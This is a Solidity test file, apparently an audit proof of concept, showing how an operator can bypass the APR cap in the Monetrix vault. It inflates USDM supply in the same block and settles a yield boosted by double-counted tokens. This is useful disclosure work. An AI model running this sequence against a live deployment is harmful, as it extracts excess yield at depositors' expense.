import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";
import "../src/core/YieldEscrow.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deposit USDC into the vault to establish baseline backing and surplus.
// 2. [T=1000] Operator deposits a large amount of USDC to mint USDM, inflating the total USDM supply.
// 3. [T=1000] In the same block, the inflated USDM supply relaxes the APR cap denominator in Gate 4 of settleDailyPnL.
// 4. [T=1000] Operator calls vault.settle() with a proposedYield equal to the massively inflated surplus (boosted by double-counted spot tokens).
// 5. [Assert] Verify that the yield was successfully settled and distributed to the yield escrow, bypassing the APR cap.

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        // 1. Setup: Fund the vault with USDC to create a positive surplus
        address attacker = address(0xA11CE);
        vm.deal(attacker, 100 ether);

        // Deposit USDC to the vault to establish backing
        _deposit(attacker, 10_000_000e6);

        // Record initial state
        uint256 settledYieldBefore = accountant.totalSettledYield();
        uint256 escrowBalanceBefore = yieldEscrow.balance();

        // 2. [T=1000] Warp to a valid settlement time
        vm.warp(block.timestamp + 1 days);

        // 3. [T=1000] Attacker (operator) deposits a massive amount to mint USDM, inflating the APR cap denominator
        // This relaxes the APR cap in Gate 4 of settleDailyPnL
        _deposit(attacker, 100_000_000e6);

        // 4. [T=1000] In the same block, operator proposes a massive yield extraction
        // The double-counting of spot hedge tokens inflates distributableSurplus
        // The same-block USDM minting inflates the APR cap, allowing this large proposedYield to pass
        int256 surplus = accountant.distributableSurplus();
        uint256 proposedYield = surplus > 0 ? uint256(surplus) : 1_000_000e6;

        vm.prank(operator);
        vault.settle(proposedYield);

        // 5. [Assert] Verify the exploit succeeded
        uint256 settledYieldAfter = accountant.totalSettledYield();
        uint256 escrowBalanceAfter = yieldEscrow.balance();

        console.log("Settled Yield Before:", settledYieldBefore);
        console.log("Settled Yield After:", settledYieldAfter);
        console.log("Escrow Balance Before:", escrowBalanceBefore);
        console.log("Escrow Balance After:", escrowBalanceAfter);

        assertGt(settledYieldAfter, settledYieldBefore, "Yield was settled bypassing APR cap");
        assertGt(escrowBalanceAfter, escrowBalanceBefore, "Excess yield was distributed to escrow");
    }
}

